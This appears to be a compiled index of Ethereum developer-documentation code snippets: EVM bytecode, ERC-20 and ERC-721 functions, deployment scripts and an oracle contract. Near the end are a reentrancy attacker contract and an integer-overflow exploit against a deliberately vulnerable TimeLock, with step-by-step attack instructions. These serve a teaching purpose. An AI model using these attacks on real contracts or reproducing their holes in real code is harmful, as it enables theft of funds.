ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x3CC JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x3FD JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x3FD JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x3FC JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x3DF JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x40C SWAP2 SWAP1 PUSH3 0x410 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x435 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x417 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x10F1 DUP1 PUSH3 0x448 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1\n```\n\n----------------------------------------\n\nTITLE: Token Metadata Getter Functions\nDESCRIPTION: Implements three view functions to retrieve token metadata: name, symbol, and decimals. These functions help user interfaces display token information properly.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * ether and wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n     * called.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n```\n\n----------------------------------------\n\nTITLE: Cancelling a Trade in ERC-721 Marketplace in Solidity\nDESCRIPTION: Function that allows the original poster to cancel an open trade. The item is transferred back from the contract to the poster, and the trade status is updated to 'Cancelled'.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction cancelTrade(uint256 _trade)\n  public\n{\n  Trade memory trade = trades[_trade];\n  require(\n    msg.sender == trade.poster,\n    \"Trade can be cancelled only by poster.\"\n  );\n  require(trade.status == \"Open\", \"Trade is not Open.\");\n  itemToken.transferFrom(address(this), trade.poster, trade.item);\n  trades[_trade].status = \"Cancelled\";\n  emit TradeStatusChange(_trade, \"Cancelled\");\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up and Executing Ethereum Transactions in NFT Minter\nDESCRIPTION: Configures and executes an Ethereum transaction to mint an NFT using MetaMask. This code sets up transaction parameters, requests user confirmation via MetaMask, and returns appropriate status messages based on transaction success or failure.\n\nLANGUAGE: javascript\nCODE:\n```\n//set up your Ethereum transaction\nconst transactionParameters = {\n  to: contractAddress, // Required except during contract publications.\n  from: window.ethereum.selectedAddress, // must match user's active address.\n  data: window.contract.methods\n    .mintNFT(window.ethereum.selectedAddress, tokenURI)\n    .encodeABI(), //make call to NFT smart contract\n}\n\n//sign the transaction via MetaMask\ntry {\n  const txHash = await window.ethereum.request({\n    method: \"eth_sendTransaction\",\n    params: [transactionParameters],\n  })\n  return {\n    success: true,\n    status:\n      \"✅ Check out your transaction on Etherscan: https://ropsten.etherscan.io/tx/\" +\n      txHash,\n  }\n} catch (error) {\n  return {\n    success: false,\n    status: \"😥 Something went wrong: \" + error.message,\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Implementation Contract Documentation Comment in Solidity\nDESCRIPTION: This documentation comment explains the purpose and implementation details of the ERC20 contract. It clarifies that the implementation is agnostic to token creation, mentions the behavior of reverting on failure, and explains additional features like approval events and allowance adjustment functions.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin guidelines: functions revert instead\n * of returning `false` on failure. This behavior is nonetheless conventional\n * and does not conflict with the expectations of ERC20 applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Token Contract in Solidity\nDESCRIPTION: A complete implementation of a basic ERC-like token contract in Solidity. The contract allows an owner to mint new tokens and enables users to transfer tokens between addresses. It includes ownership validation, balance tracking using mappings, and event emission for transfers.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.5.10;\n\ncontract Token {\n    // An `address` is comparable to an email address - it's used to identify an account on Ethereum.\n    // Addresses can represent a smart contract or an external (user) accounts.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/types.html#address\n    address public owner;\n\n    // A `mapping` is essentially a hash table data structure.\n    // This `mapping` assigns an unsigned integer (the token balance) to an address (the token holder).\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/types.html#mapping-types\n    mapping (address => uint) public balances;\n\n    // Events allow for logging of activity on the blockchain.\n    // Ethereum clients can listen for events in order to react to contract state changes.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#events\n    event Transfer(address from, address to, uint amount);\n\n    // Initializes the contract's data, setting the `owner`\n    // to the address of the contract creator.\n    constructor() public {\n        // All smart contracts rely on external transactions to trigger its functions.\n        // `msg` is a global variable that includes relevant data on the given transaction,\n        // such as the address of the sender and the ETH value included in the transaction.\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/units-and-global-variables.html#block-and-transaction-properties\n        owner = msg.sender;\n    }\n\n    // Creates an amount of new tokens and sends them to an address.\n    function mint(address receiver, uint amount) public {\n        // `require` is a control structure used to enforce certain conditions.\n        // If a `require` statement evaluates to `false`, an exception is triggered,\n        // which reverts all changes made to the state during the current call.\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/control-structures.html#error-handling-assert-require-revert-and-exceptions\n\n        // Only the contract owner can call this function\n        require(msg.sender == owner, \"You are not the owner.\");\n\n        // Enforces a maximum amount of tokens\n        require(amount < 1e60, \"Maximum issuance exceeded\");\n\n        // Increases the balance of `receiver` by `amount`\n        balances[receiver] += amount;\n    }\n\n    // Sends an amount of existing tokens from any caller to an address.\n    function transfer(address receiver, uint amount) public {\n        // The sender must have enough tokens to send\n        require(amount <= balances[msg.sender], \"Insufficient balance.\");\n\n        // Adjusts token balances of the two addresses\n        balances[msg.sender] -= amount;\n        balances[receiver] += amount;\n\n        // Emits the event defined earlier\n        emit Transfer(msg.sender, receiver, amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Total Supply Getter Function\nDESCRIPTION: Implements the ERC-20 totalSupply function that returns the total amount of tokens in circulation. This is an override of the function declared in the IERC20 interface.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Ownership Control with Ownable Contract in Solidity\nDESCRIPTION: A simplified version of the Ownable contract from OpenZeppelin that designates an address as the owner of a contract and provides an onlyOwner modifier to restrict access to specific functions.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Ownable {\n    address public owner;\n\n    constructor() internal {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Writing a Deployment Script for Ethereum Smart Contracts\nDESCRIPTION: A JavaScript deployment script using ethers.js to deploy the HelloWorld smart contract to the Ethereum network. It initializes the contract with a greeting message and logs the deployed contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n   const HelloWorld = await ethers.getContractFactory(\"HelloWorld\");\n\n   // Start deployment, returning a promise that resolves to a contract object\n   const hello_world = await HelloWorld.deploy(\"Hello World!\");\n   console.log(\"Contract deployed to address:\", hello_world.address);}\n\nmain()\n  .then(() => process.exit(0))\n  .catch(error => {\n    console.error(error);\n    process.exit(1);\n  });\n```\n\n----------------------------------------\n\nTITLE: Completing ERC-20 TransferFrom with Allowance Update in Solidity\nDESCRIPTION: This code completes the transferFrom function by reducing the caller's allowance after the transfer. It uses the safe subtraction method to ensure the allowance doesn't go negative, reverting with an error message if the requested amount exceeds allowance.\n\nLANGUAGE: solidity\nCODE:\n```\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,\n         \"ERC20: transfer amount exceeds allowance\"));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Smart Contract Interaction Script\nDESCRIPTION: Full JavaScript script for interacting with the Hello World smart contract, including reading the initial message, updating it, and reading the new message.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Transfer Function in Solidity\nDESCRIPTION: The transfer function allows users to send tokens from their account to another address. It validates the recipient is not the zero address and that the sender has sufficient balance, then delegates to the internal _transfer function.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-transfer}.\n *\n * Requirements:\n *\n * - `recipient` cannot be the zero address.\n * - the caller must have a balance of at least `amount`.\n */\nfunction transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n```\n\n----------------------------------------\n\nTITLE: Implementing a Request-Response Oracle Contract in Solidity\nDESCRIPTION: This code implements a simple blockchain oracle contract that can query external APIs upon request from other smart contracts. It includes functionality for creating data requests, updating responses from multiple oracles, and reaching consensus on the final result with a minimum quorum requirement.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.21 <0.6.0;\n\ncontract Oracle {\n  Request[] requests; //list of requests made to the contract\n  uint currentId = 0; //increasing request id\n  uint minQuorum = 2; //minimum number of responses to receive before declaring final result\n  uint totalOracleCount = 3; // Hardcoded oracle count\n\n  // defines a general api request\n  struct Request {\n    uint id;                            //request id\n    string urlToQuery;                  //API url\n    string attributeToFetch;            //json attribute (key) to retrieve in the response\n    string agreedValue;                 //value from key\n    mapping(uint => string) answers;     //answers provided by the oracles\n    mapping(address => uint) quorum;    //oracles which will query the answer (1=oracle hasn't voted, 2=oracle has voted)\n  }\n\n  //event that triggers oracle outside of the blockchain\n  event NewRequest (\n    uint id,\n    string urlToQuery,\n    string attributeToFetch\n  );\n\n  //triggered when there's a consensus on the final result\n  event UpdatedRequest (\n    uint id,\n    string urlToQuery,\n    string attributeToFetch,\n    string agreedValue\n  );\n\n  function createRequest (\n    string memory _urlToQuery,\n    string memory _attributeToFetch\n  )\n  public\n  {\n    uint length = requests.push(Request(currentId, _urlToQuery, _attributeToFetch, \"\"));\n    Request storage r = requests[length-1];\n\n    // Hardcoded oracles address\n    r.quorum[address(0x6c2339b46F41a06f09CA0051ddAD54D1e582bA77)] = 1;\n    r.quorum[address(0xb5346CF224c02186606e5f89EACC21eC25398077)] = 1;\n    r.quorum[address(0xa2997F1CA363D11a0a35bB1Ac0Ff7849bc13e914)] = 1;\n\n    // launch an event to be detected by oracle outside of blockchain\n    emit NewRequest (\n      currentId,\n      _urlToQuery,\n      _attributeToFetch\n    );\n\n    // increase request id\n    currentId++;\n  }\n\n  //called by the oracle to record its answer\n  function updateRequest (\n    uint _id,\n    string memory _valueRetrieved\n  ) public {\n\n    Request storage currRequest = requests[_id];\n\n    //check if oracle is in the list of trusted oracles\n    //and if the oracle hasn't voted yet\n    if(currRequest.quorum[address(msg.sender)] == 1){\n\n      //marking that this address has voted\n      currRequest.quorum[msg.sender] = 2;\n\n      //iterate through \"array\" of answers until a position if free and save the retrieved value\n      uint tmpI = 0;\n      bool found = false;\n      while(!found) {\n        //find first empty slot\n        if(bytes(currRequest.answers[tmpI]).length == 0){\n          found = true;\n          currRequest.answers[tmpI] = _valueRetrieved;\n        }\n        tmpI++;\n      }\n\n      uint currentQuorum = 0;\n\n      //iterate through oracle list and check if enough oracles(minimum quorum)\n      //have voted the same answer as the current one\n      for(uint i = 0; i < totalOracleCount; i++){\n        bytes memory a = bytes(currRequest.answers[i]);\n        bytes memory b = bytes(_valueRetrieved);\n\n        if(keccak256(a) == keccak256(b)){\n          currentQuorum++;\n          if(currentQuorum >= minQuorum){\n            currRequest.agreedValue = _valueRetrieved;\n            emit UpdatedRequest (\n              currRequest.id,\n              currRequest.urlToQuery,\n              currRequest.attributeToFetch,\n              currRequest.agreedValue\n            );\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Standard Methods Implementation in Solidity\nDESCRIPTION: This snippet shows the required method signatures that must be implemented by any ERC-20 compliant smart contract. These methods handle token transfers, balance checking, supply information, and approval management.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction name() public view returns (string)\nfunction symbol() public view returns (string)\nfunction decimals() public view returns (uint8)\nfunction totalSupply() public view returns (uint256)\nfunction balanceOf(address _owner) public view returns (uint256 balance)\nfunction transfer(address _to, uint256 _value) public returns (bool success)\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool success)\nfunction approve(address _spender, uint256 _value) public returns (bool success)\nfunction allowance(address _owner, address _spender) public view returns (uint256 remaining)\n```\n\n----------------------------------------\n\nTITLE: Implementing ownerOf Function for ERC-721\nDESCRIPTION: A view function that returns the address of the owner of a specific NFT by token ID. It throws an error if the token ID does not exist or is invalid (owned by zero address).\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef ownerOf(_tokenId: uint256) -> address:\n    \"\"\"\n    @dev Returns the address of the owner of the NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId The identifier for an NFT.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    return owner\n```\n\n----------------------------------------\n\nTITLE: Implementing _approve Function in ERC-20 Contract\nDESCRIPTION: Internal function that sets the allowance for a spender over an owner's tokens. It requires non-zero addresses for both owner and spender and updates the allowance mapping. Used by the approve function and other internal mechanisms.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n *\n * This internal function is equivalent to `approve`, and can be used to\n * e.g. set automatic allowances for certain subsystems, etc.\n *\n * Emits an {Approval} event.\n *\n * Requirements:\n *\n * - `owner` cannot be the zero address.\n * - `spender` cannot be the zero address.\n */\nfunction _approve(address owner, address spender, uint256 amount) internal virtual {\n    require(owner != address(0), \"ERC20: approve from the zero address\");\n    require(spender != address(0), \"ERC20: approve to the zero address\");\n\n    _allowances[owner][spender] = amount;\n```\n\n----------------------------------------\n\nTITLE: Initializing Node.js Project for Ethereum Development\nDESCRIPTION: Command to initialize a new Node.js project with npm, which creates a package.json file to manage dependencies for the smart contract project.\n\nLANGUAGE: bash\nCODE:\n```\nnpm init\n```\n\n----------------------------------------\n\nTITLE: Implementing a Counter Smart Contract in Solidity\nDESCRIPTION: A Counter smart contract with owner and factory access controls. It tracks a count value that can only be incremented by the owner through the factory contract.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.5.17;\n\ncontract Counter {\n\n    uint256 private _count;\n    address private _owner;\n    address private _factory;\n\n\n     modifier onlyOwner(address caller) {\n        require(caller == _owner, \"You're not the owner of the contract\");\n        _;\n    }\n\n    modifier onlyFactory() {\n        require(msg.sender == _factory, \"You need to use the factory\");\n        _;\n    }\n\n     constructor(address owner) public {\n        _owner = owner;\n        _factory = msg.sender;\n    }\n\n     function getCount() public view returns (uint256) {\n        return _count;\n    }\n\n    function increment(address caller) public onlyFactory onlyOwner(caller) {\n        _count++;\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Add Liquidity ETH Function Implementation in Solidity\nDESCRIPTION: The implementation of the addLiquidityETH function that handles wrapping ETH to WETH, calculating optimal amounts, transferring tokens, and minting liquidity tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) {\n    (amountToken, amountETH) = _addLiquidity(\n        token,\n        WETH,\n        amountTokenDesired,\n        msg.value,\n        amountTokenMin,\n        amountETHMin\n    );\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n    IWETH(WETH).deposit{value: amountETH}();\n    assert(IWETH(WETH).transfer(pair, amountETH));\n```\n\n----------------------------------------\n\nTITLE: Creating a Reentrancy Attack Contract in Solidity\nDESCRIPTION: This code showcases an attacker contract designed to exploit the reentrancy vulnerability in the Victim contract. It uses a fallback function to recursively call the victim's withdraw function and drain its funds.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Attacker {\n    function beginAttack() external payable {\n        Victim(victim_address).deposit.value(1 ether)();\n        Victim(victim_address).withdraw();\n    }\n\n    function() external payable {\n        if (gasleft() > 40000) {\n            Victim(victim_address).withdraw();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Exploiting Integer Overflow in a Time-Locked Ethereum Contract\nDESCRIPTION: This example demonstrates how an attacker can exploit integer overflow to bypass a time lock mechanism in a smart contract. The TimeLock contract allows users to deposit ether but enforces a one-week waiting period before withdrawal, while the Attack contract exploits the overflow vulnerability in the increaseLockTime function to reset the lock time.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.6;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for at least a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(block.timestamp > lockTime[msg.sender], \"Lock time not expired\");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        2**256 = type(uint).max + 1\n        so x = type(uint).max + 1 - t\n        */\n        timeLock.increaseLockTime(\n            type(uint).max + 1 - timeLock.lockTime(address(this))\n        );\n        timeLock.withdraw();\n    